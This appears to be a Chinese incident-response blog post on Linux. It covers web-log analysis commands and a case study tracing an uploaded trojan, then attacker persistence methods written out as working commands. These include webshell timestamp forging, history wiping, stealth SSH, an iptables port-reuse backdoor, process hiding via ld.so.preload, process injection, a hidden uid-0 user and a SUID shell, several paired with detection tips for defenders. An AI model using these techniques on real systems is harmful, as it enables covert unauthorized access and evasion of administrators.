class="line">2、查看当天有多少个IP访问：</span><br><span class="line">awk &#x27;&#123;print $1&#125;&#x27; log_file|sort|uniq|wc -l</span><br><span class="line"></span><br><span class="line">3、查看某一个页面被访问的次数：</span><br><span class="line">grep &quot;/index.php&quot; log_file | wc -l</span><br><span class="line"></span><br><span class="line">4、查看每一个IP访问了多少个页面：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print a,S[a]&#125;&#x27; log_file</span><br><span class="line"></span><br><span class="line">5、将每个IP访问的页面数进行从小到大排序：</span><br><span class="line">awk &#x27;&#123;++S[$1]&#125; END &#123;for (a in S) print S[a],a&#125;&#x27; log_file | sort -n</span><br><span class="line"></span><br><span class="line">6、查看某一个IP访问了哪些页面：</span><br><span class="line">grep ^111.111.111.111 log_file| awk &#x27;&#123;print $1,$7&#125;&#x27;</span><br><span class="line"></span><br><span class="line">7、去掉搜索引擎统计当天的页面：</span><br><span class="line">awk &#x27;&#123;print $12,$1&#125;&#x27; log_file | grep ^\&quot;Mozilla | awk &#x27;&#123;print $2&#125;&#x27; |sort | uniq | wc -l</span><br><span class="line"></span><br><span class="line">8、查看2018年6月21日14时这一个小时内有多少IP访问:</span><br><span class="line">awk &#x27;&#123;print $4,$1&#125;&#x27; log_file | grep 21/Jun/2018:14 | awk &#x27;&#123;print $2&#125;&#x27;| sort | uniq | wc -l	</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x03-日志分析案例"><a href="#0x03-日志分析案例" class="headerlink" title="0x03 日志分析案例"></a>0x03 日志分析案例</h4><p>Web日志分析实例：通过nginx代理转发到内网某服务器，内网服务器某站点目录下被上传了多个图片木马，虽然II7下不能解析，但还是想找出谁通过什么路径上传的。</p>
+<p>在这里，我们遇到了一个问题：由于设置了代理转发，只记录了代理服务器的ip，并没有记录访问者IP？这时候，如何去识别不同的访问者和攻击源呢？</p>
+<p>这是管理员日志配置不当的问题，但好在我们可以通过浏览器指纹来定位不同的访问来源，还原攻击路径。</p>
+<p>1、定位攻击源</p>
+<p>首先访问图片木马的记录，只找到了一条，由于所有访问日志只记录了代理IP，并不能通过IP来还原攻击路径，这时候，可以利用浏览器指纹来定位。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/log-3-1.png"></p>
+<p>浏览器指纹：</p>
+<p><code>Mozilla/4.0+(compatible;+MSIE+7.0;+Windows+NT+6.1;+WOW64;+Trident/7.0;+SLCC2;+.NET+CLR+2.0.50727;+.NET+CLR+3.5.30729;+.NET+CLR+3.0.30729;+.NET4.0C;+.NET4.0E)</code></p>
+<p>2、搜索相关日志记录</p>
+<p>通过筛选与该浏览器指纹有关的日志记录，可以清晰地看到攻击者的攻击路径。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/log-3-2.png"></p>
+<p>3、对找到的访问日志进行解读，攻击者大致的访问路径如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">A、攻击者访问首页和登录页</span><br><span class="line">B、攻击者访问MsgSjlb.aspx和MsgSebd.aspx</span><br><span class="line">C、攻击者访问Xzuser.aspx</span><br><span class="line">D、攻击者多次POST（怀疑通过这个页面上传模块缺陷）</span><br><span class="line">E、攻击者访问了图片木马</span><br></pre></td></tr></table></figure>
+
+<p>打开网站，访问Xzuser.aspx，确认攻击者通过该页面的进行文件上传了图片木马，同时，发现网站了存在越权访问漏洞，攻击者访问特定URL，无需登录即可进入后台界面。通过日志分析找到网站的漏洞位置并进行修复。</p>
+<h4 id="0x04-日志统计分析技巧"><a href="#0x04-日志统计分析技巧" class="headerlink" title="0x04 日志统计分析技巧"></a>0x04 日志统计分析技巧</h4><p>统计爬虫：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -E <span class="string">&#x27;Googlebot|Baiduspider&#x27;</span>  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123; print $1 &#125;&#x27;</span> | sort | uniq</span><br></pre></td></tr></table></figure>
+
+<p>统计浏览器：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep -v -E <span class="string">&#x27;MSIE|Firefox|Chrome|Opera|Safari|Gecko|Maxthon&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">100</span>		</span><br></pre></td></tr></table></figure>
+
+<p>IP 统计：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">grep <span class="string">&#x27;23/May/2019&#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.&quot;$4&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">10</span></span><br><span class="line">   <span class="number">2206</span> <span class="number">219.136</span><span class="number">.134</span><span class="number">.13</span></span><br><span class="line">   <span class="number">1497</span> <span class="number">182.34</span><span class="number">.15</span><span class="number">.248</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">211.140</span><span class="number">.143</span><span class="number">.100</span></span><br><span class="line">   <span class="number">1431</span> <span class="number">119.145</span><span class="number">.149</span><span class="number">.106</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">61.183</span><span class="number">.15</span><span class="number">.179</span></span><br><span class="line">   <span class="number">1427</span> <span class="number">218.6</span><span class="number">.8</span><span class="number">.189</span></span><br><span class="line">   <span class="number">1422</span> <span class="number">124.232</span><span class="number">.150</span><span class="number">.171</span></span><br><span class="line">   <span class="number">1421</span> <span class="number">106.187</span><span class="number">.47</span><span class="number">.224</span></span><br><span class="line">   <span class="number">1420</span> <span class="number">61.160</span><span class="number">.220</span><span class="number">.252</span></span><br><span class="line">   <span class="number">1418</span> <span class="number">114.80</span><span class="number">.201</span><span class="number">.18</span>			</span><br></pre></td></tr></table></figure>
+
+<p>统计网段：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $1&#125;&#x27;</span> | awk -F<span class="string">&#x27;.&#x27;</span> <span class="string">&#x27;&#123;print $1&quot;.&quot;$2&quot;.&quot;$3&quot;.0&quot;&#125;&#x27;</span> | sort | uniq -c | sort -r -n | head -n <span class="number">200</span>			</span><br></pre></td></tr></table></figure>
+
+<p>统计域名：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $2&#125;&#x27;</span>|sort|uniq -c|sort -rn|more		</span><br></pre></td></tr></table></figure>
+
+<p>HTTP Status：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $9&#125;&#x27;</span>|sort|uniq -c|sort -rn|more</span><br><span class="line"><span class="number">5056585</span> <span class="number">304</span></span><br><span class="line"><span class="number">1125579</span> <span class="number">200</span></span><br><span class="line">   <span class="number">7602</span> <span class="number">400</span></span><br><span class="line">      <span class="number">5</span> <span class="number">301</span>	</span><br></pre></td></tr></table></figure>
+
+<p>URL 统计：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat  /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span>|sort|uniq -c|sort -rn|more			</span><br></pre></td></tr></table></figure>
+
+<p>文件流量统计：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more</span><br><span class="line"></span><br><span class="line">grep <span class="string">&#x27; 200 &#x27;</span> /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log |awk <span class="string">&#x27;&#123;sum[$7]+=$10&#125;END&#123;for(i in sum)&#123;print sum[i],i&#125;&#125;&#x27;</span>|sort -rn|more			</span><br></pre></td></tr></table></figure>
+
+<p>URL访问量统计：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk <span class="string">&#x27;&#123;print $7&#125;&#x27;</span> | egrep <span class="string">&#x27;\?|&amp;&#x27;</span> | sort | uniq -c | sort -rn | more			</span><br></pre></td></tr></table></figure>
+
+<p>脚本运行速度：</p>
+<p>查出运行速度最慢的脚本</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -v <span class="number">0</span>$ /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | awk -F <span class="string">&#x27;\&quot; &#x27;</span> <span class="string">&#x27;&#123;print $4&quot; &quot; $1&#125;&#x27;</span> web.<span class="property">log</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$8&#125;&#x27;</span> | sort -n -k <span class="number">1</span> -r | uniq &gt; <span class="regexp">/tmp/</span>slow_url.<span class="property">txt</span>			</span><br></pre></td></tr></table></figure>
+
+<p>IP, URL 抽取：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># tail -f /www/logs/access<span class="number">.2019</span>-<span class="number">02</span>-<span class="number">23.</span>log | grep <span class="string">&#x27;/test.html&#x27;</span> | awk <span class="string">&#x27;&#123;print $1&quot; &quot;$7&#125;&#x27;</span>			</span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux权限维持–隐藏篇"><a href="#Linux权限维持–隐藏篇" class="headerlink" title="Linux权限维持–隐藏篇"></a>Linux权限维持–隐藏篇</h3><h4 id="0x00-前言-2"><a href="#0x00-前言-2" class="headerlink" title="0x00 前言"></a>0x00 前言</h4><p>攻击者在获取服务器权限后，会通过一些技巧来隐藏自己的踪迹和后门文件，本文介绍Linux下的几种隐藏技术。</p>
+<h4 id="0x01-隐藏文件"><a href="#0x01-隐藏文件" class="headerlink" title="0x01 隐藏文件"></a>0x01 隐藏文件</h4><p>Linux 下创建一个隐藏文件：<code>touch  .test.txt</code>  </p>
+<p>touch 命令可以创建一个文件，文件名前面加一个 点 就代表是隐藏文件,如下图：</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-1.png"></p>
+<p>一般的Linux下的隐藏目录使用命令<code>ls -l</code>是查看不出来的，只能查看到文件及文件夹，查看Linux下的隐藏文件需要用到命令：<code>ls -al</code></p>
+<p>这里，我们可以看到在&#x2F;tmp下，默认存在多个隐藏目录，这些目录是恶意文件常用来藏身的地方。如<code>/temp/.ICE-unix/、/temp/.Test-unix/、/temp/.X11-unix/、/temp/.XIM-unix/</code></p>
+<h4 id="0x02-隐藏文件时间戳"><a href="#0x02-隐藏文件时间戳" class="headerlink" title="0x02 隐藏文件时间戳"></a>0x02 隐藏文件时间戳</h4><p>Unix 下藏后门必须要修改时间，否则很容易被发现，直接利用 touch 就可以了。</p>
+<p>比如参考 index.php 的时间，再赋给 webshell.php，结果两个文件的时间就一样了。</p>
+<p>利用方法</p>
+<p>touch -r index.php webshell.php</p>
+<p>或者直接将时间戳修改成某年某月某日。如下 2014 年 01 月 02 日。</p>
+<p>touch -t 1401021042.30 webshell.php</p>
+<h4 id="0x03-隐藏权限"><a href="#0x03-隐藏权限" class="headerlink" title="0x03 隐藏权限"></a>0x03 隐藏权限</h4><p>在Linux中，使用chattr命令来防止root和其他管理用户误删除和修改重要文件及目录，此权限用ls -l是查看不出来的，从而达到隐藏权限的目的。</p>
+<p>这个技巧常被用在后门，变成了一些难以清除的后门文件，令很多新手朋友感到头疼。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chattr +i evil.php 锁定文件</span><br><span class="line">lsattr  evil.php   属性查看</span><br><span class="line">chattr -i evil.php 解除锁定</span><br><span class="line">rm -rf 1.evil.php  删除文件</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-2.png"></p>
+<h4 id="0x04-隐藏历史操作命令"><a href="#0x04-隐藏历史操作命令" class="headerlink" title="0x04 隐藏历史操作命令"></a>0x04 隐藏历史操作命令</h4><p>在shell中执行的命令，不希望被记录在命令行历史中，如何在linux中开启无痕操作模式呢？</p>
+<p>技巧一：只针对你的工作关闭历史记录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[space]set +o history</span><br><span class="line">备注：[space] 表示空格。并且由于空格的缘故，该命令本身也不会被记录。</span><br></pre></td></tr></table></figure>
+
+<p>上面的命令会临时禁用历史功能，这意味着在这命令之后你执行的所有操作都不会记录到历史中，然而这个命令之前的所有东西都会原样记录在历史列表中。</p>
+<p>要重新开启历史功能，执行下面的命令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Space]set -o history</span><br><span class="line">它将环境恢复原状，也就是你完成了你的工作，执行上述命令之后的命令都会出现在历史中。</span><br></pre></td></tr></table></figure>
+
+<p>技巧二：从历史记录中删除指定的命令</p>
+<p>假设历史记录中已经包含了一些你不希望记录的命令。这种情况下我们怎么办？很简单。通过下面的命令来删除：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history | grep &quot;keyword&quot;</span><br></pre></td></tr></table></figure>
+
+<p>输出历史记录中匹配的命令，每一条前面会有个数字。从历史记录中删除那个指定的项：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">history -d [num]</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-3.png"></p>
+<p>这种技巧是关键记录删除，或者我们可以暴力点，比如前150行是用户的正常操作记录，150以后是攻击者操作记录。我们可以只保留正常的操作，删除攻击痕迹的历史操作记录，这里，我们只保留前150行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;150,$d&#x27; .bash_history</span><br></pre></td></tr></table></figure>
+
+<h4 id="0x05-隐藏远程SSH登陆记录"><a href="#0x05-隐藏远程SSH登陆记录" class="headerlink" title="0x05 隐藏远程SSH登陆记录"></a>0x05 隐藏远程SSH登陆记录</h4><p>#隐身登录系统，不会被w、who、last等指令检测到。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T root@127.0.0.1 /bin/bash -i</span><br></pre></td></tr></table></figure>
+
+<p>不记录ssh公钥在本地.ssh目录中</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="0x06-端口复用"><a href="#0x06-端口复用" class="headerlink" title="0x06 端口复用"></a>0x06 端口复用</h4><p>通过端口复用来达到隐藏端口的目的，在Linux下，如何实现端口复用呢？</p>
+<p>第一种方式：通过SSLH在同一端口上共享SSH与HTTPS</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">#安装SSLH</span><br><span class="line">sudo apt-get install sslh</span><br><span class="line">#配置SSLH</span><br><span class="line">编辑 SSLH 配置文件：</span><br><span class="line">sudo vi /etc/default/sslh</span><br><span class="line">1、找到下列行：Run=no  将其修改为：Run=yes</span><br><span class="line">2、修改以下行以允许 SSLH 在所有可用接口上侦听端口 443</span><br><span class="line">DAEMON_OPTS=&quot;--user sslh --listen 0.0.0.0:443 --ssh 127.0.0.1:22 --ssl 127.0.0.1:443 --pidfile /var/run/sslh/sslh.pid&quot;</span><br></pre></td></tr></table></figure>
+
+<p>第二种方式：利用IPTables进行端口复用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"># 端口复用链</span><br><span class="line">iptables -t nat -N LETMEIN</span><br><span class="line"># 端口复用规则</span><br><span class="line">iptables -t nat  -A LETMEIN -p tcp -j REDIRECT --to-port 22</span><br><span class="line"># 开启开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#x27;threathuntercoming&#x27; --algo bm -m recent --set --name letmein --rsource -j ACCEPT</span><br><span class="line"># 关闭开关</span><br><span class="line">iptables -A INPUT -p tcp -m string --string &#x27;threathunterleaving&#x27; --algo bm -m recent --name letmein --remove -j ACCEPT</span><br><span class="line"># let&#x27;s do it</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80 --syn -m recent --rcheck --seconds 3600 --name letmein --rsource -j LETMEIN</span><br></pre></td></tr></table></figure>
+
+<p>利用方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#开启复用</span><br><span class="line">echo threathuntercoming | socat - tcp:192.168.28.128:80</span><br><span class="line">#ssh使用80端口进行登录</span><br><span class="line">ssh -p 80 root@192.168.28.128</span><br><span class="line">#关闭复用</span><br><span class="line">echo threathunterleaving | socat - tcp:192.168.28.128:80</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-4.png"></p>
+<p> 具体文章详见：<a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/network/137683.html">远程遥控 IPTables 进行端口复用</a></p>
+<h4 id="0x07-进程隐藏"><a href="#0x07-进程隐藏" class="headerlink" title="0x07 进程隐藏"></a>0x07 进程隐藏</h4><p>管理员无法通过相关命令工具查找到你运行的进程，从而达到隐藏目的，实现进程隐藏。</p>
+<p>第一种方法：libprocesshider</p>
+<p>github项目地址：<a target="_blank" rel="noopener" href="https://github.com/gianlucaborello/libprocesshider">https://github.com/gianlucaborello/libprocesshider</a></p>
+<p>利用 LD_PRELOAD 来实现系统函数的劫持，实现如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https://github.com/gianlucaborello/libprocesshider.git</span><br><span class="line">cd libprocesshider/ &amp;&amp; make</span><br><span class="line"># 移动文件到/usr/local/lib/目录下</span><br><span class="line">cp libprocesshider.so /usr/local/lib/</span><br><span class="line"># 把它加载到全局动态连接局</span><br><span class="line">echo /usr/local/lib/libprocesshider.so &gt;&gt; /etc/ld.so.preload</span><br></pre></td></tr></table></figure>
+
+<p>测试：运行 evil_script.py，</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-5.png"></p>
+<p>此时发现在top 与 ps 中都无法找到 evil_script.py， cpu 使用率高,但是却找不到任何占用cpu高的程序。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-6.png"></p>
+<p>如何在Linux中发现隐藏的进程，</p>
+<p><code>unhide</code> 是一个小巧的网络取证工具，能够发现那些借助rootkit，LKM及其它技术隐藏的进程和TCP &#x2F; UDP端口。这个工具在Linux，UNIX类，MS-Windows等操作系统下都可以工作。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="http://www.unhide-forensics.info/">http://www.unhide-forensics.info/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 安装</span><br><span class="line">sudo yum install unhide</span><br><span class="line"># 使用</span><br><span class="line">unhide [options] test_list</span><br></pre></td></tr></table></figure>
+
+<p>使用<code>unhide proc</code>发现隐藏进程evil_script.py，如下图所示：</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-7.png"></p>
+<p>第二种方法：进程注入工具linux-inject</p>
+<p>linux-inject是用于将共享对象注入Linux进程的工具</p>
+<p>github项目地址： <a target="_blank" rel="noopener" href="https://github.com/gaffe23/linux-inject.git">https://github.com/gaffe23/linux-inject.git</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载程序编译</span><br><span class="line">git clone https://github.com/gaffe23/linux-inject.git</span><br><span class="line">cd linux-inject &amp;&amp; make</span><br><span class="line"># 测试进程</span><br><span class="line">./sample-target</span><br><span class="line"># 进程注入</span><br><span class="line">./inject -n sample-target sample-library.so</span><br></pre></td></tr></table></figure>
+
+<p>验证进程注入成功，如下图所示：</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-2-8.png"></p>
+<p>Cymothoa是一款隐秘的后门工具。它通过向目标主机活跃的进程注入恶意代码，从而获取和原进程相同的权限。该工具最大的优点就是不创建新的进程，不容易被发现。</p>
+<p>下载地址：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/">https://sourceforge.net/projects/cymothoa/files/cymothoa-1-beta/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 下载解压</span><br><span class="line">wget https://jaist.dl.sourceforge.net/project/cymothoa/cymothoa-1-beta/cymothoa-1-beta.tar.gz</span><br><span class="line">tar zxvf cymothoa-1-beta.tar.gz </span><br><span class="line"># </span><br><span class="line">cd cymothoa-1-beta &amp;&amp; make</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h3 id="Linux权限维持–后门篇"><a href="#Linux权限维持–后门篇" class="headerlink" title="Linux权限维持–后门篇"></a>Linux权限维持–后门篇</h3><p>本文将对Linux下常见的权限维持技术进行解析，知己知彼百战不殆。</p>
+<h4 id="1、一句话添加用户和密码"><a href="#1、一句话添加用户和密码" class="headerlink" title="1、一句话添加用户和密码"></a><strong>1、一句话添加用户和密码</strong></h4><p>添加普通用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的普通用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest</span><br><span class="line"></span><br><span class="line"># useradd -p 方法  ` ` 是用来存放可执行的系统命令,&quot;$()&quot;也可以存放命令执行语句</span><br><span class="line">useradd -p &quot;$(openssl passwd -1 123456)&quot; guest</span><br><span class="line">	</span><br><span class="line"># chpasswd方法</span><br><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">	</span><br><span class="line"># echo -e方法</span><br><span class="line">useradd test;echo -e &quot;123456\n123456\n&quot; |passwd test</span><br></pre></td></tr></table></figure>
+
+<p>添加root用户：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 创建一个用户名guest，密码123456的root用户</span><br><span class="line">useradd -p `openssl passwd -1 -salt &#x27;salt&#x27; 123456` guest -o -u 0 -g root -G root -s /bin/bash -d /home/test</span><br></pre></td></tr></table></figure>
+
+<p>可疑用户排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 查询特权用户特权用户(uid 为0)</span><br><span class="line">[root@localhost ~]# awk -F: &#x27;$3==0&#123;print $1&#125;&#x27; /etc/passwd</span><br><span class="line"># 查询可以远程登录的帐号信息</span><br><span class="line">[root@localhost ~]# awk &#x27;/\$1|\$6/&#123;print $1&#125;&#x27; /etc/shadow</span><br><span class="line"># 除root帐号外，其他帐号是否存在sudo权限。如非管理需要，普通帐号应删除sudo权限</span><br><span class="line">[root@localhost ~]# more /etc/sudoers | grep -v &quot;^#\|^$&quot; | grep &quot;ALL=(ALL)&quot;</span><br></pre></td></tr></table></figure>
+
+<h4 id="2、SUID-Shell"><a href="#2、SUID-Shell" class="headerlink" title="2、SUID Shell"></a><strong>2、SUID Shell</strong></h4><p>Suid shell是一种可用于以拥有者权限运行的shell。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">配合普通用户权限使用</span><br><span class="line">cp /bin/bash /tmp/shell</span><br><span class="line">chmod u+s /tmp/shell</span><br></pre></td></tr></table></figure>
+
+<p>使用guest用户登录就可疑获取root权限。</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-1.png"></p>
+<p>备注：bash2针对suid做了一些防护措施，需要使用-p参数来获取一个root shell。另外，普通用户执行这个SUID shell时，一定要使用全路径。</p>
+<p>排查技巧：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 在Linux中查找SUID设置的文件</span><br><span class="line">find . -perm /4000 </span><br><span class="line"># 在Linux中查找使用SGID设置的文件</span><br><span class="line">find . -perm /2000</span><br><span class="line"># 取消s权限</span><br><span class="line">chmod u-s /tmp/shell</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="3、ssh公私钥免密登录"><a href="#3、ssh公私钥免密登录" class="headerlink" title="3、ssh公私钥免密登录"></a><strong>3、ssh公私钥免密登录</strong></h4><p>在客户端上生成一对公私钥，然后把公钥放到服务器上（~&#x2F;.ssh&#x2F;authorized_keys），保留私钥。当ssh登录时，ssh程序会发送私钥去和服务器上的公钥做匹配。如果匹配成功就可以登录了。</p>
+<p>客户端：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa</span><br></pre></td></tr></table></figure>
+
+<p>过程中按三次回车，执行结束如下图:</p>
+<p><img src="/2025/08/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94-Linux%E7%AF%87/privilege-5-2.png"></p>
+<p>进入&#x2F;root&#x2F;.ssh&#x2F;文件夹，查看文件夹的内容，如下所示：</p>
